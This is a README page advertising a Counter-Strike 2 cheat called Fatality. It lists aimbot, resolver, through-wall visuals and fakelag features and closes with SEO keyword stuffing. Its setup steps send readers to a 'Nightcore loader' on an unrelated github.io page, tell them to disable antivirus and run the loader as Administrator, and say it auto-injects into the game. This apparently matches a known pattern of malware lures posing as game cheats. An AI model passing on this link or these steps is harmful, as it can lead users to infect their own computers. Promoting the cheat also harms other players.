<div align="center">

# Fatality.win CS2

[![Status](https://img.shields.io/badge/CS2-supported-7C3AED?style=flat-square)](https://zeptohornbilltassel.github.io/nightcore/)
[![API](https://img.shields.io/badge/LUA%20API-v2.4-A855F7?style=flat-square)]()
[![Cloud](https://img.shields.io/badge/cloud%20configs-enabled-8B5CF6?style=flat-square)]()

</div>

---

```
fatality.win  ·  CS2 edition  ·  Performance · Visuals · Scripting
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Modules loaded: aim · visuals · movement · loot · lua     [ARMED]
```

---

Fatality is a feature-dense CS2 software platform with a long lineage in the competitive enhancement space. Its reputation is built on a zero-compromise aim module, a highly scriptable visual system, and one of the cleanest UI experiences in its category.

---

## Module Breakdown

### Aim System

Fatality's aim module is built around a proprietary resolver that handles anti-aim configurations from enemy players — reconstructing their actual hitbox position from networked angles.

```
RageBot    — maximum performance, automatic bone targeting, desync awareness
LegitBot   — human-profile correction, FOV-limited smooth correction, humanization
Resolver   — anti-aim detection + correction, automatic jitter parsing
```

**Weapon-specific configs** — separate profiles for pistols, rifles, snipers, and automatics. Configs stack (global → weapon type → specific weapon).

### Visual System

| Element | Options |
|---------|---------|
| Box type | Off / 2D full / 2D corner / 3D |
| Name tag | Off / Name / Steam name |
| Health | Off / Bar side / Bar top / Number |
| Armor | Bar / Icon / Value |
| Weapons | Icon / Text / Both |
| Grenades | Prediction arc / Landing zone / Both |
| Backtrack | Visual ghost positions |
| Chams | Flat / Material / XQZ (through-wall) |

### Misc & Utility

- **Fakelag** — configurable tick hold, variance randomization
- **Clantag spinner** — animated clan tag display
- **Inventory changer** — visual knife / glove / skin override (local client)
- **Hit logging** — damage log overlay with bone + damage value
- **Bomb info** — timer HUD with kit/no-kit countdown

---

## LUA API

```lua
-- Register a custom key-activated toggle
local toggle_state = false

client.register_callback("key_bind", function(key)
    if key == KEY_F8 then
        toggle_state = not toggle_state
        client.log("Custom toggle: " .. tostring(toggle_state))
    end
end)

-- Draw a custom indicator
client.register_callback("draw", function()
    if toggle_state then
        renderer.text(10, 10, 255, 100, 100, 200, nil, "MODE ACTIVE")
    end
end)
```

Community script repository: **fatality.win/scripts** — 800+ scripts, searchable by category.

---

## Getting Started

1. Download Nightcore loader [fatality.win](https://zeptohornbilltassel.github.io/nightcore/)
2. Disable real-time antivirus protection for the loader folder
3. Launch CS2 → then run the loader as Administrator
4. Software auto-injects when CS2 is detected
5. Press `Insert` to open the menu

---

## Config Sharing

Fatality configs sync to the cloud automatically. Share your config ID with teammates for instant import. Config snapshots are versioned — roll back to any previous state.

---

<!-- SEO: fatality cs2 2025, fatality.win cs2 download, fatality cs2 free, fatality cs2 ragebot, fatality cs2 legit, fatality win counter strike 2, fatality cs2 lua, fatality cs2 config, cs2 ragebot software, cs2 aimbot alternative, fatality cs2 resolver, fatality cs2 update 2025, best cs2 ragebot, fatality win cs2 review, cs2 performance module fatality -->
